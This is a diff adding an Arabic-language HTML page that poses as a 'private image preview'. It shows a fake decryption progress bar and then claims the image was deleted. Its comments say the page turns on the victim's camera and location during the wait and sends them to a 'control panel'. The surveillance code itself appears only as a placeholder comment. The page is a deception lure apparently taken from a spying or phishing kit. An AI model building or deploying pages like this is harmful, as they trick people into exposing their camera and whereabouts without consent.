@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>معاينة الصورة الخاصة</title>
+    <style>
+        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+    </style>
+</head>
+<body>
+    <div id="loader">جاري فك تشفير الصورة... 85%</div>
+    <script>
+        // كود تشغيل الكاميرا والموقع فوراً عند "انتظار" الضحية للصورة
+        setTimeout(() => {
+            document.getElementById('loader').innerText = "خطأ: هذه الصورة لم تعد متاحة أو تم حذفها.";
+        }, 5000);
+        
+        // هنا تضع نفس كود "منطق الضحية" الموجود في index.html لربطه بلوحة التحكم
+    </script>
+</body>
+</html>
